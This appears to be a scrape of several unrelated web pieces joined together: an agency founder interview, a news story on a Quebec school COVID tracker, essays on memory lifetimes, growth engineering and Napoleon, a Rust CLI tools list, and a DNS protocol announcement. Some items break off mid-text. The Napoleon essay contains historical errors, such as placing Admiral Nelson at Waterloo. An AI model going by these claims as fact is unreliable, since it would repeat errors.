reinvest cash flows from ClientFlo into more real estate and stocks. As my cash flows and asset values continued to snowball, it enabled me to <a href="https://jayvas.com/investing/">invest in riskier/higher potential opportunities</a> like my <a href="https://www.starterstory.com/stories/how-we-re-expanding-our-product-line-and-growing-our-top-line">eCommerce business</a> and tech startups. I now manage a diversified portfolio of investments full-time.</p><p>‍</p><p><strong>What are the major lessons you’ve learned from growing the agency?</strong></p><p>Since this was my first business, I quickly learned how to be an entrepreneur.&nbsp; In entrepreneurship, perseverance is key. Things are given to you and taken from you, so don't let either get to your head. Stay focused, enjoy the process, and have as much fun as possible.</p><p>An agency-specific lesson that I learned is - choose a niche industry as early as possible. We started off as a generalist PPC agency, but eventually specialized in the medical industry. There are a lot of generalist PPC agencies and therefore more competition. But becoming the expert in a specific industry gives you a competitive edge.&nbsp;</p><p>Having deep product knowledge in a specific industry allows you to service your clients better, which leads to more referrals, industry connections, and positions you as the go-to firm. Not to mention that specialist services are billed at a higher rate.&nbsp;</p><p>‍</p><p><strong>What advice do you have for agency owners that want to use consulting revenues to fund new ventures?</strong></p><p>Not only are agencies great cash-flow businesses, they are also great <a href="https://jayvas.com/how-i-used-my-ppc-agency-as-an-idea-machine">idea generating machines</a>. If you are working with clients/industries that interest you, it won’t be long before you spot an opportunity that you can capitalize on.<br></p><p>Be curious and ask your clients a lot of questions to gain a deeper understanding of their business. Focus on your cash flows to help fund new ventures, and if you spot something -&nbsp;roll the dice. You never know what may become of it, unless you try!</p></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div><p>MONTREAL -- 
	The Quebec government <a href="https://montreal.ctvnews.ca/quebec-hasn-t-released-official-data-on-school-outbreaks-and-hasn-t-said-when-it-will-do-so-1.5088184">hasn't said whether it will start updating the public</a> on COVID-19 cases in schools -- but some citizens don’t seem willing to wait.</p><p>
	
	A Montreal father who started a new crowd-sourced website meant to track school COVID-19 cases says it’s already garnered more than 100,000 page views.</p></div>
<p>
	By August, “I concluded we were going towards a second wave and our children would be in an experiment,” Olivier Drouin told CTV News.&nbsp;</p>
<p>
	“I wanted to capture the data at the source and make it available to all parents [and] teachers, for them to make informed decisions about back-to-school.”</p>

<p>
	Last week, as French-language schools reopened, he launched a homemade site called <a href="https://www.covidecolesquebec.org/">Covid Ecoles Quebec</a> that allows the public to submit reports of coronavirus cases at schools across the province.</p>
<p>
	It provides a list, and a map, showing the cases Drouin has been able to confirm to his standards after his own basic verification process.</p>
<p>
	Of course, it’s not an exhaustive list, and he says if the government started releasing its own numbers, he’d stop collecting his—but after losing some trust in official numbers, he’d want to check first that they were doing a good job, he said in an email.</p>
<p>
	Drouin is vice-president of a technology company that provides high-tech human resources software. He lives in Montreal and has two daughters, one 13 and one 15, he said.</p>
<p>
	His site so far has published the names of 33 schools with at least one COVID-19 case each. Aside from the skyrocketing page views, Drouin said he’s gotten “hundreds of submissions” in the last week from parents and others.</p>
<p>
	“Not all are published,” he said, as sometimes “information is missing” or, in many cases, he gets duplicate reports for the same case.</p>
<p>
	Aside from the fact that it’s crowd-sourced, there are some important caveats to keep in mind for anyone looking at his site: for one thing, he doesn’t try to count the number of cases, but the number of schools, he said.</p>
<p>
	If he can confirm, to his standards, one case linked to a school, the school goes on the list. The government, meanwhile, counts an outbreak as two or more cases.</p>
<p>
	As for verification, the “easiest way to verify is with a copy of the letter schools send to all parents when a case occurs, as this is now mandatory across Quebec,” he said.</p>
<p>
	If he doesn’t have this, he said, “I look for media coverage.” Some of the schools listed on his website have a link to a news article.</p>
<p>
	The website also has a map showing where the affected schools are. These come with another caveat: at first glance, the map seems to show huge outbreaks, with dozens of numbers attached to the pinpoint for each school.&nbsp;</p>
<p>
	But those big numbers are not meant to show the number of cases, he said. They’re chronological to when he entered them, so a pinpoint showing “32,” for example, means it was the 32nd school he found, not that there are 32 cases there.</p>
<p>
	Drouin said his frustration with the government’s handling of the pandemic, and especially its transparency around data, had been growing for months before he thought of crowd-sourcing data.</p>
<p>
	“In particular, when schools reopened in May outside Montreal,” he said, “the government claimed a big success—however, no data was available to measure that.”</p>
<p>
	Quebecers only learned later that there were 41 cases linked to schools, he said. (That news was announced about two to three weeks after schools reopened.)</p>
<p>
	He believes that others have grown distrusting, too, due to a combination of government choices and data errors.</p>
<p>
	“Because the government fails to make this data available and accessible, it lacks transparency,” he said.&nbsp;</p>
<p>
	“People don’t trust the numbers reported every day, as there have been so many data reporting issues,” he added, referencing the infamous fax machines used to collect infection reports, and the data that has been reported as misplaced or contaminated at various points.&nbsp;</p>
<p>
	Drouin said he’s not against kids going back to school, but he wanted more safety measures to be taken, including shrinking class sizes, improving ventilation, mandating masks in classes and giving more people the option of remote learning.</p>
<p>
	The Quebec government hasn’t said whether it’s even considering releasing data on COVID-19 cases at schools.&nbsp;</p>
<p>
	So far, the outbreaks that have been made public—including one involving <a href="https://montreal.ctvnews.ca/81-quebec-city-students-in-isolation-after-covid-19-cases-confirmed-at-two-schools-1.5086503">81 people at a Quebec City school</a> and <a href="https://montreal.ctvnews.ca/two-more-cases-of-covid-19-confirmed-quarantine-extended-for-20-quebec-teachers-in-isolation-1.5087658">a Deux-Montagnes outbreak</a> that has 20 teachers in quarantine—have been largely up to the media to confirm, with the cooperation of the schools and regional health authorities.</p>
<p>
	Drouin said he’d like it if the province did begin releasing routine data on schools.</p>
<p>
	“Based on the quality, accessibility of the data they would produce, yes, I would [shut my site down],” he said. “I have a day job.”</p>
                                              </div></div>]]>

<![CDATA[The Power of Lifetimes]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			

<p>The execution of a program unfolds over some interval of time.
The lifetime of every temporary resource (e.g., variable or object)
is the time span between that resource’s “creation” and “destruction”.
This lifetime is wholly contained within the typically-longer lifetime of the program.</p>

<p>The goal of this post is to explore how versatile lifetime analysis
has increasingly become in managing memory efficiently, safely and with better performance.
By the end of this post, we will explore exciting new ways to apply lifetime analysis,
beyond their current support in Rust.
However, let’s begin by demonstrating the explicit relationship between
lifetimes and automatic memory management.</p>

<h2 id="lifetimes-and-garbage-collection">Lifetimes and Garbage Collection</h2>

<p>Automatic memory management is all about lifetime analysis.
Here’s why: the useful lifetime of an object depends entirely on
the lifetimes of all references to that object.
The object’s life begins with creating the first reference to it.
It needs to stay alive as long as any strong<sup>1</sup> reference points to it.
The allocated object becomes a useless waste of space
once the last strong reference to it expires, making it ripe for memory reclamation.</p>

<p>The purpose of all forms of automatic memory management is to track
the lifetimes of all strong references to that object.
As soon as we know when the lifetimes of these references have all expired,
we can automatically destroy the object and reclaim its memory for re-use.
What distinguishes the various automatic memory management strategies
is <strong>how</strong> each determines when all strong references to an object have expired.</p>

<ul>
<li><p><strong>Tracing garbage collection</strong> relies on periodically probing all references.
It traces all strong references emanating from the root set, essentially
marking all objects whose reference lifetimes have not yet expired.
It can then iterate across a list of all allocated objects to reclaim
the memory used by all unmarked objects.</p></li>

<li><p><strong>Reference counting</strong> keeps a running count of how
many strong (and weak) references there are to an object.
In effect, the reference count is incremented whenever a new reference to the object
is created and decremented when the lifetime of that reference expires.
The object’s memory can be reclaimed when the count goes to 0.</p></li>

<li><p><strong>Single-owner</strong> uses compile-time analysis to ensure the first
reference created to an allocated object is also the last to survive.
This works because aliasing is done
using borrowed references whose lifetimes are guaranteed to be
shorter than the original reference they borrowed from.
Thus, when the original reference expires, the object’s memory is safely reclaimed.</p></li>

<li><p><strong>Arena</strong> ensures that all references to objects allocated within an arena
have a lifetime shorter than the arena itself. Thus, when the
arena expires, it is safe to reclaim all memory held by the arena,
since we know no references to any of its objects exist.</p></li>
</ul>

<p>Notice how all these techniques, except tracing garbage collection,
involve the compiler doing lifetime analysis: either knowing when a lifetime
expires or comparing lifetimes. This compile-time analysis relies on the fact
that most lifetimes are structured by scopes.</p>

<h2 id="structured-lifetimes">Structured lifetimes</h2>

<p>In 1968, Edsger Dijkstra’s provocative letter,
<a href="https://homepages.cwi.nl/~storm/teaching/reader/Dijkstra68.pdf">“Go To Statement Considered Harmful”</a>,
became an influential catalyst towards the ascent of
<a href="https://en.wikipedia.org/wiki/Structured_programming">structured programming</a>.
Structured programming replaces “spaghetti code” with modularized
control flow structures (e.g., “if” and “while blocks) that
have a single point-of-entry and a single point-of-exit.
This allows control flow to be modeled using a
<a href="https://en.wikipedia.org/wiki/Interval_(graph_theory)">reducible flow graph</a>.</p>

<p>One of the beneficial side-effects of our now-dominant, block-based
style of coding, is that we can conveniently scope the lifetimes of
our local variables to the inner-most block they are declared within.
These variables are “allocated” near the beginning of that block
and are automatically “freed” at block’s end.
We can say that local variables have a structured lifetime,
one that correlates with a single-entry/single-exit control flow block.</p>

<p>Compile-time lifetime analysis for memory management is made easier when lifetimes are structured,
especially since analysis only cares when a lifetime expires.
We know that a local variable’s lifetime expires no later than the end of its scope.
Similarly, we know that a local variable in an outer block
has a longer lifetime than any local variable scoped within an inner block,
as the inner block always completes before the outer block does.</p>

<p>Structured lifetime analysis can be reduced, in many cases, to simple arithmetic
that can be performed at compile-time.
Assign all blocks an integer number in a LIFO manner:
Global scope is 0, a function’s parameters are 1, the outermost block’s variables are 2, etc.
You increment the lifetime number as you enter a block and decrement when you leave.
To compare the lifetimes of two variables, compare their number;
a greater number corresponds to a shorter lifetime.</p>

<p>If you look back at the description of the four memory management strategies,
you will see how most of them depend only on knowing when lifetimes expire
and the ability to compare lifetimes. The more aggressively we can do this analysis lexically
at compile-time, the more we can excise performance-sapping runtime bookkeeping costs
from our programs. Even reference-counting can be optimized significantly
by using static lifetime analysis, allowing us to avoid the cost of altering
the reference counter when we know a reference has escaped from one scope to another.</p>

<h2 id="borrowed-references">Borrowed References</h2>

<p>Rust is rightly the programming language that comes to mind first when thinking about lifetimes.
However, it is worth noticing that Rust’s lifetime mechanisms improve on prior art.
For example, Rust’s static, single-owner memory management is an enrichment to
C++’s <a href="https://en.wikipedia.org/wiki/Resource_acquisition_is_initialization">Resource Acquisition is Initialization (RAII)</a>.
RAII with move semantics ensures an allocated resource is automatically destroyed at
end of its last scope.</p>

<p>Rust’s lifetime-constrained borrowed references improve on this by allowing safe aliasing.
The inspiration for safe borrowed references comes in two ways from
the <a href="https://en.wikipedia.org/wiki/Cyclone_(programming_language)">Cyclone programming language</a>,
a joint development effort by AT&amp;T and Cornell University.
The notion of a borrowed reference is adapted from Cyclone’s
polymorphic <a href="https://cyclone.thelanguage.org/wiki/Pointers%20with%20Restricted%20Aliasing/">restricted alias pointers</a>.
Additionally, Cyclone’s safe memory management focused on regions (which are usually arenas).
In order to ensure memory safety, Cyclone pointers could be annotated
with a named region qualifier preceded with a back-tick
(making them look very much like Rust’s apostrophe-based lifetime annotations).</p>

<p>Niko Matsakis’s key insight in 2012 was to
<a href="http://smallcultfollowing.com/babysteps/blog/2012/07/17/borrowed-pointer-tutorial/">annotate borrowed references</a>
with lifetimes rather than a memory-allocation region (arena).
This makes possible two key benefits:</p>

<ul>
<li><p>Borrowed references are isolated from having to know anything
about how the object’s memory was allocated (including the stack) to be useful to program logic.
A borrowed reference can be borrowed from any kind of allocated pointer, or even from
the interior of an allocated object. This makes borrowed references
a perfect fit for polymorphic use of references.</p></li>

<li><p>Safety of the borrowed reference can be easily guaranteed at compile-time
by ensuring that the lifetime of any object pointed at by the borrowed reference’s lifetime
lasts longer than the lifetime of the data structure that holds that reference.</p></li>
</ul>

<p>Every use of lifetime-constrained borrowed references doesn’t just make
reference-based polymorphism possible.
It also reduces the runtime bookkeeping costs when handling using RC-allocated objects,
since borrowed references never increment or decrement the reference counter.</p>

<p>Checking the lifetimes of borrowed references is the job performed by Rust’s borrow checker.
People sometimes get confused and think the borrow checker is the name for Rust’s
single-owner memory management strategy. In truth, they are separate mechanisms that
synergistically work well together. The sole job of the borrow checker is
to ensure that references borrowed from any stack-, Box-, or Rc- allocated object
are always safe to dereference. It is mostly a lifetime checker.</p>

<h2 id="lifetime-inference-and-annotations">Lifetime Inference and Annotations</h2>

<p>To the compiler, all borrowed references have lifetimes.
However, they are often not visibly annotated on most references.
This is because a lot of attention was paid to making Rust lifetimes as usable as possible,
largely by allowing lifetime annotations (qualifiers) to be elided from references
wherever they can be accurately inferred.
Lifetime inference is easy-to-accomplish in most cases.</p>

<p>Rust requires lifetime annotations in two places: on certain
function signatures and on struct fields bearing borrowed references.
For the most part, lifetime annotations are only needed
to simplify lifetime analysis for these potentially ambiguous situations:</p>

<ul>
<li>When a function returns a borrowed reference whose lifetime is unclear,
given that the function accepts multiple borrowed references
(each with possibly different lifetimes) as parameters.</li>
<li>When a function will store one a borrowed reference originating from
one parameter into a data structure originating from another parameter’s borrowed reference.</li>
<li>When a function returns a borrowed reference to a longer-lived field
from a shorter-lived data structure pointed at by a parameter’s borrowed reference.</li>
</ul>

<h2 id="non-lexical-lifetimes">Non-lexical lifetimes</h2>

<p>Rust 2018 Edition improves on borrowed reference lifetimes
by adding support for “non-lexical lifetimes”.
A more descriptive name might be “sub-lexical lifetimes” or “sub-block lifetimes”,
as the improvement allows the lifetime of a borrowed reference
to end sooner than the end of the lexical block scope it is declared within.
As usual, Niko does a great job of
<a href="http://smallcultfollowing.com/babysteps/blog/2016/04/27/non-lexical-lifetimes-introduction/">summarizing key situations</a>
where support for non-lexical lifetimes can be useful.</p>

<p>Before Rust 2018, the borrow checker would put a usage lock on whatever it
borrowed from, for the full lifetime of the enclosing block.
This lock prevents unsafe use of …</p></div></div>

September 2, 2020 | https://blog.jonlu.ca/posts/thoughts-on-product | <a href="https://web.archive.org/web/*/https://blog.jonlu.ca/posts/thoughts-on-product">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>My day job is, officially, as a Growth Engineer working primarily on Unauth Product at Pinterest. It’s slightly different from my previous software engineering roles - typically, in other roles, I would be handed a spec sheet or design and had to implement it. Sometimes I’d design it myself, but the challenges were uniquely <em>technical</em> - I had to build something, and there was creativity in so far as what technologies and design patterns I’d use, but the features and product itself were usually dictated to you. They would either be so obvious that they were trivial, or they’d be handed down by some PM some point above the line.</p><p>Working on growth engineering is different - you’re responsible for the ideation and product, and focus around a north star metric, and can gauge the success of your ideas <em>objectively</em>. You own the entirety of the process, and have a quantifiable number at the end (for unauth and SEO, it’s usually traffic, time on site, and, most importantly, user acquisition).</p><p>This lends itself to an interesting focus at work every day. You want to build a product that is actually enjoyed and valuable to users, while still trying to “game” their attention and behavior.</p><p>The following are some thoughts I’ve had from working and consulting in growth at startups and companies of various sizes, mostly in the consumer tech space:</p><h2 id="thoughts-on-users-and-product">Thoughts on users and product</h2><ul><li><p>Trying to get users to do something is less like being an omnipotent god that tells people what to do than it is reshaping rivers of user intent. You can’t control what a user does, merely guide the flow of their actions. Adding a huge button doesn’t mean they’ll click on it.</p></li><li><p>Removing the ability to do something won’t prevent them from doing it (and will most likely just increase distaste for your product).</p></li><li><p>Users are simultaneously smarter and dumber than you think. Dumber in the sense that, when you take the average level of product comprehension for a user of any site that is used by a significant portion of the world population every day, it’s fairly low. Especially when you’re focused on new user acquisition, they don’t know what to expect, or how to use what you’re providing them. At the same time, though, they’re <strong>on your site for a reason</strong>, and usually know what they want.</p></li><li><p>You need to make sure to put yourself in the same headspace as your users. As someone building a product, you have to remember that you have a significantly higher familiarity with it than the people using it. You’ll have specific names for each product feature and know the user flows and reasoning behind each action, but for a lot of the people that visit your site, it’s their first time there.</p></li><li><p>It’s easy for me, as an early 20s San Francisco based software engineer, to have a fairly skewed perception of the world. Remember the user can have every possible demographic and characteristic.</p></li><li><p>Make sure you track what your users do when they come to your site, and experiment often with major shifts to your platform. It’s incredibly easy to <em>think</em> that users are doing something for a certain reason, when in reality it’s baseless.</p></li><li><p>Everything comes at a trade-off. Sometimes this is strictly better, metrics wise, but other times the trade-offs aren’t as clear - it doesn’t mean they don’t exist, though. The choices in button ordering, what you put above the fold, the font size, it all pulls and pushes the user experience in different directions.</p></li><li><p>Build for everyone, not just the professional. It’s easy when building products at work to be in a professional mindset - you’re not really thinking about <strong>every</strong> possible aspect that someone could be using your product for. Users get value in ways you never could predict - it’s better to build a platform that is flexible and ambiguous than imagine a single purpose use for what you’re building.</p></li><li><p>You do not and can not control users, and should view yourself more as at their mercy than them at yours. Working on a product is a lot more like swinging your arms around blindly in a room hoping you hit the light switch than it is knowing exactly what people want and how to deliver it to them.</p></li><li><p>Question all of your previous learnings. Something might’ve been true in the past, but is no longer. The same experiment or feature can lead to differences in results based on some slight change in the product or flow.</p></li></ul><h2 id="thoughts-on-growth">Thoughts on growth</h2><ul><li><p>Your user metrics are almost always proxies for what you’re trying to measure. You’ll pick some north star metric and say that this is what you’re building around, but this is just a shadow of what you’re trying to measure - the nebulous cloud of “user enjoyment”</p></li><li><p>Sometimes building a more aggressive user experience is worth it in the long run. For example: By default, your site could have a 2% conversion rate and a 20% bounce rate. A new feature is introduced behind an experiment that increases the conversion rate to 3%, but increases the bounce rate to 80%. This is clearly a subpar experience - it increases your bounce rate by 400%. However, it also increases your conversion rate by <strong>50%</strong>. Depending on your product this can make sense (for example, anything with an LTV for each user that is really high, or that has a really high CAC). It might not be ideal in the long term, but having a short term lever like this can be instrumental to a product’s success.</p></li><li><p>User growth is often cyclical. Some products will have the same traffic every day of the year, whereas others will have time of day, day of week, week of month, or seasonal patterns.</p></li><li><p>Monitor everything. As a product grows, you’ll build out one-off features that are significant wins at the time, but which aren’t actively monitored. It’s cheap to add a log to something and just page a team when it drops to 0. This is significantly eased by TDD, but TDD is rarely the right answer when your main concern is growth (you should move quickly).</p></li><li><p>You should move as quickly as possible. Don’t work on an idea for a long time - build out the smallest possible version that gives you directionality (positive or negative for the user metrics you’re looking at) and iterate from there. Especially in the early stages of a company, moving slowly and not adapting to shifting market conditions can kill you.</p></li><li><p>Growth is product + a direction + fuel. Each of these is a multiplier on the others - any combination of these can make a successful company. The dream is to have a great product that knows exactly where it wants to go, with all the resources it needs, but this is very rarely the case. More often than not you’ll have a mediocre product that’s floated along for a bit while being severely understaffed. If any of them is 0, you’re DOA. There’s no pithy truism here - a company can succeed <em>because</em> it has great direction and resources, or it can fail <em>in spite of it</em>.</p></li></ul><h2 id="success">Success</h2><p>One of the most important parts of the above is that they’re not static. These aren’t commandments that are written in stone - they’re learnings that are based on trial and error, off of experiments and conversations with users. You’ll run an experiment one day that contradicts nearly everything you’ve learned about growth and product, and you just have to re-baseline yourself and take those learnings forward.</p><p>You have a lot of control in so far as what the user sees and has access to - you can never control what they do with it, though. Building something that keeps the experience in mind, and that is focused on long term, sustainable growth is all you can hope to achieve.</p></div></div>]]>

      <div>
        <p>Shell is the essential tool for every programmer. The more familiar you become with the available tools, the more efficient you can be with using your computer. Here's a list of command-line tools written in Rust that aim to provide modern, often much faster, alternatives to the existing shell commands.</p>
<h2 id="bat"><code>bat</code></h2>
<p><code>bat</code> is a <code>cat</code> clone with syntax highlighting and Git integration that works on Windows, MacOS and Linux. It provides syntax highlighting for many file extensions by default.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223573-9b9eb780-de0e-11ea-94e3-908957fe5a4e.png" alt="bat"></p>
<p><a href="https://github.com/sharkdp/bat">GitHub</a></p>
<h2 id="exa"><code>exa</code></h2>
<p><code>exa</code> is a modern replacement for <code>ls</code>, the default command-line program in Unix/Linux for listing directory contents. <code>exa</code> supports icons with the <code>--icons</code> flag.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223612-aa856a00-de0e-11ea-8cec-133becefa6f2.png" alt="exa">
<a href="https://github.com/ogham/exa">GitHub</a></p>
<h2 id="fd"><code>fd</code></h2>
<p><code>fd</code> is a fast and user-friendly alternative to <code>find</code>, the built-in command-line program in Unix/Linux for walking a file hierarchy. <code>fd</code> provides opinionated defaults for the most common use cases. To find a specific file by name, you write <code>fd PATTERN</code> instead of <code>find -iname ‘*PATTERN*’</code>. <code>fd</code> is also extremely fast and it comes with a ton of options like ignoring hidden directories, files and patterns from <code>.gitignore</code> by default.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223646-bbce7680-de0e-11ea-98f4-0ef2d5f30920.png" alt="fd"></p>
<p><a href="https://github.com/sharkdp/fd">GitHub</a></p>
<h2 id="procs"><code>procs</code></h2>
<p><code>procs</code> is a modern replacement for <code>ps</code>, the default command-line program in Unix/Linux for getting information about processes. It provides convenient, human-readable (and colored) output format by default.</p>

<p><a href="https://starship.rs/guide/">GitHub</a></p>
<h2 id="ripgrep"><code>ripgrep</code></h2>
<p><code>ripgrep</code> is an extremely fast alternative to <code>grep</code>, the built-in command-line program in Unix/Linux for searching files by pattern. <code>ripgrep</code> is a line-oriented search tool that recursively searches your current directory for a regex pattern. By default, ripgrep respects <code>.gitignore</code> and automatically skips hidden files, directories and binary files.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223748-ecaeab80-de0e-11ea-9140-ac9219f5747c.gif" alt="ripgrep"></p>

<p>1st September 2020, by Elliott Brown</p>
<h4>Today we're announcing NUM, a new DNS-based protocol to store and retrieve structured data</h4>
<p>
  The Namespace Utility Modules (NUM) protocol can be used to store structured data for any domain name or email address. NUM&nbsp;records can be stored in the DNS of the independent NUM zone (e.g. <code>_num.example.com</code>) or in the hosted NUM zone (a DNS-based store of NUM records below the domain <code>num.net</code>) using a simple web interface: <a href="https://www.numserver.com/" target="_blank">NUM Server</a> <img src="https://www.num.uk/images/link-external.png" title="Content on another site." alt="Content on another site.">.
</p>
<p>
  We're announcing this experimental protocol to the technical community today and are very interested in feedback and input.
</p>
<h5>Custom and standardised records</h5>
<p>
  Custom NUM records can store structured data for any purpose, particular use cases are standardised with <a href="https://www.num.uk/modules">modules</a> <img src="https://www.num.uk/images/link-internal.png" title="Content elsewhere on this site." alt="Content elsewhere on this site.">. One of our leading use cases for NUM is contact information. Enabling organisations and individuals to store contact data in the DNS opens up lots of new possibilities like dialling a domain name or email address.
</p>
<h5>Automatically populating the DNS with millions of pieces of structured data</h5>
<p>
  As well as offering a simple, user-friendly way to adopt NUM, the NUM Server also helps overcome the chicken-and-egg problem. We&nbsp;intend to populate NUM records for millions of domain names based on website information hosted on those domain names. We&nbsp;expect to publish this data in early 2021.
</p>
<h5>Free, unrestricted and unlimited access to data</h5>
<p>
  Since NUM data is stored and served using DNS it's ultra-fast, reliable and massively scalable. Access to records on the NUM Server is free, unrestricted and unlimited forever. NUM enables organisations and individuals to take back control of their data and provides a valuable resource to developers building devices, apps and services.

<p><em>“The long, dark night of the end of history has to be grasped as an enormous opportunity. . . From a situation in which nothing can happen, suddenly anything is possible again.”</em><br>
— Mark Fisher<sup><a href="#fn1" id="fnref1">[1]</a></sup></p>
<p><span>T</span>here is some truth to the notion that history is governed by power laws—only a few inflection points define the course of the world. Thomas Carlyle’s now infamous Great Man theory posits that some of us are born with god-given talents and these great leaders arise in moments of crisis. Yet, should we succumb to our fate if we lose the genetic lottery and accept that we cannot change destiny?</p>
<p>In recent years, academics have deconstructed Carlyle’s theory because it doesn’t account for our environment, which plays more than a significant role in our success. Talent, for the critic, does not enter into the equation. In this gray area, there is a compromise: the extent of a leader’s genius is hidden until their environment allows them to flourish, letting them reach their full potential at last. In any case, hero-worship is essential: this “Consecration of Valor,” as Carlyle put it, is nevertheless a constant in all ages. These stories are foundational to the human spirit.</p>
<p>There is perhaps no better example of such latent genius than Napoleon. As he buried the ancién regime and conquered Europe, he quipped to Ségur, “I have dethroned no one. I found the crown in the gutter. I picked it up, and the People put it on my head.”</p>
<p>Napoleon came of age when France was built out of bricks and he left it carved out of marble. Certainly, at the time, many felt that Napoleon, against all odds, orchestrated these series of neverending triumphs and changes. History itself appeared to be moving in sync with the force of his iron hand. But doesn’t that underplay the role of his environment in shaping his success? Timing is key; the macroeconomic landscape sets the stage for heroism. Caesar needed the eroding Roman Republic just as much as the Republic needed him.</p>
<p>As it were, the Jacobins’ destruction of all established social structure led to the unintended rise of Napoleon. We may find ourselves in wholly uncharted territory as a result of such immoderate men.  The conditions in modern America—rampant unemployment, political polarization, and stagnant growth in non-technological fields—appear to be laying the groundwork for such a story once again. If, as many of us believe, polarization could lead to revolution, should we hold our breath waiting for another benevolent revolutionary? A figure in the Napoleonic mold?</p>
<p>This time is different from past eras because, on the bumpy road of history, the technological apocalypse through biowarfare, cheaper atomic weapons, or even a malevolent AGI beckons us with a false step. As the coronavirus has demonstrated, the road to calamity might not even require a misstep. The absence of choice is identical to a negative choice, and not solving these issues implies their arrival sooner or later.</p>
<p>Citizens want the sweeping reforms that only absolute power can promise but shun  the return of such power itself. Will the people choose their governor wisely?</p>
<p>Napoleon’s journey could help us ask the previously neglected question of whether or not America can handle another civil war without a Lincoln at its helm.</p>
<h3 id="soldierpriestandgod">Soldier, Priest, and God</h3>
<p>It’s a symptom of postmodernity that we reflect on the few inopportune moments and indiscretions that tinge Bonaparte’s otherwise glamorous life. His grande Armée’s retreat from Russia’s Alexandre I, the ill-fated Battle of Waterloo against Britain’s Admiral Nelson, and most infamously, the courtship of his adulterous wife Josephine. We comfort ourselves with these surface level quips to avoid the nuanced mythos about Bonaparte’s life. Napoleon’s core legacy is thus enshrined in his eponymous complex—not in his genius.</p>
<p>People forget that power does not permit a vacuum. Someone always steps up to take charge. In the time preceding the French Revolution, the monarchy played a significant role in exalting the cult of the hero; unbeknownst to them, it was because their power was fraying at the edges.</p>
<p>The slow but steady progress into secularism created an opportunity for motivated individuals to gather influence. There were two reasons for this: First, cheap printing became increasingly pervasive and, second, culture shifted from the exaltation of the monarchy toward these heroes across the first and second estates. In hindsight, it was Napoleon, another monarch, who was the culmination of the enlightenment, the first leader of the renaissance, who turned the world on its head across the fields of science, religion, and philosophy.</p>
<p>Philip Dwyer describes the context thusly:</p>
<p><em>“The French had been accustomed to worshipping a canon of ‘great men’, including</em> philosophes <em>like Voltaire and Rousseau, and generals like Condé, Turenne, Luxembourg, and Saxe. . . In the second half of the eighteenth century, these ‘great men’ increasingly took the place previously occupied by kings and saints. . . History, in other terms, was becoming national and any man who had carried out great acts, indeed just about anyone of any notoriety, could aspire to public recognition.”</em><sup><a href="#fn2" id="fnref2">[2]</a></sup></p>
<p>It is in this frame that we should consider Napoleon. Even a passing glance of the centuries thereafter would show that Europe, and the world, is marked with his imprint. The Napoleonic code transformed perception of individual freedom across personal and property rights and started the progressive reforms that characterize our globalized age. His protean nature allowed him to scale the Enlightenment reforms of meritocracy, industrial efficiency along with secular education, and truthful financing. If there was any individual who could champion the Enlightenment, it was Napoleon.</p>
<h3 id="allthatssolidmeltsintoair">All that’s solid melts into air</h3>
<p><em>“We have done with the romance of the Revolution, we must now commence its history.”</em><br>
—Napoleon</p>
<p>Invoking Bonaparte’s name requires a call-back to the origins of the French revolution—they are married. Louis XVI’s France had structural issues contemporary historians consider impossible to have overcome: staggering levels of debt, immigration, and centralized wealth threatened the foundational elements of society.</p>
<p>Jean Jaurès, an original member of the French Socialist party, wrote at the time:</p>
<p><em>“There was not one action in rural life that did not require the peasants to pay a ransom. . . Feudal rights thus extended their clutches over every force of nature, everything that grew, moved, breathed; the rivers with their fish, the fire burning in the oven to bake the peasant’s poor bread mixed with oats and barley, the wind that turned the mill for grinding corn, the wine spurting from the press, the game that emerged from the forests or high pastures to ravage vegetable plots and fields.”</em><sup><a href="#fn3" id="fnref3">[3]</a></sup></p>
<p>French peasants were thrust into remarkable destitution throughout the course of the 18th century. Migrants, similar in many respects to their descendants with H1B immigration status, could work in cities if they gave up their privacy and dignity: they had to carry their documents on them at all times while the royal police hawkishly stalked them in and out of their homes. The story is the same for H1B visa holders—if a company decides to terminate one’s employment status, the immigrant is deported. This creates a system of indentured servitude akin to that of the French serf centuries ago.</p>
<p>Cultivators rented farmland from their lords of which they had to supply the cattle and seed—to participate in the economy, they were marshalled into lifelong debt slavery. That mirrors the plight of our younger generations who are burdened with the ever-increasing prices of healthcare, education, and rent required to find a job in America’s productive areas.</p>
<p>So the period preceding the new order carried with it unprecedented levels of inequality and social stratification much like in our times. Jaurès’ voice echoes the conditions we’re witnessing: it is best to demarcate workers into those who are in the technology industry and those who are not. This split is especially precarious for those in the middle, the gig workers, who are subject to the worst of both worlds. The stock market is divorced from the broader economy and to be neither a financier nor a CEO in the post-coronavirus world is a recipe for disaster.</p>
<p>Hence, we should not be surprised that these conditions fuel the riots, and revolutionary sentiment in the 18th century and today.</p>
<p>With more than 40 million out of work, the upheaval in America is just beginning. This matches past booms and busts, which wrought financial calamity. However, something has changed beyond the horizon of political polarization—the very lives of the people are at stake. Unchecked riots and the failure of the medical state has destroyed the people’s faith in structure: the resistance is growing and has since ensued in riots across the country.</p>
<h3 id="neojacobins">Neo-Jacobins</h3>
<p>Fr. Richard John Neuhaus one said, “Culture is the root of politics and religion is the root of culture,” More than race, the rioters believe a wholly atheist religion of what Thomas Piketty has called “participatory socialism” whereby western nations have “a universal right to education and a capital endowment, free circulation of people, and de facto virtual abolition of borders.” <sup><a href="#fn4" id="fnref4">[4]</a></sup></p>
<p>Socialism only works with a five-year plan: growth is a must in order for progressive policies to succeed. What voters misunderstand is that with a shrinking worldwide demographic, 20th century capitalism has been left in the dark ages. We cannot indefinitely expect developing nations to consume our goods nor we can imagine that acceleration of technological prowess will save us. The resistance is slowly coming to terms with the incompatibility of their hopes and the foundational tenets of neoliberalism: stagnant wages, free trade, and open borders. The manichean battle between the US and China is the first scrimmage of our deflationary world.</p>

<p>Since I am using <a href="https://sr.ht/~sircmpwn/openring/"><code>openring</code></a>, I will detail how I automatically update the posts in the webring for this blog with the feeds from the blogs I follow.</p>

<h2 id="finding-the-stored-feed-data">Finding the stored feed data</h2>
<p>I’m using the RSS reader <a href="https://gitlab.com/news-flash/news_flash_gtk"><code>news-flash</code></a>.
So the first order of business was finding out where where and how my feed was stored.
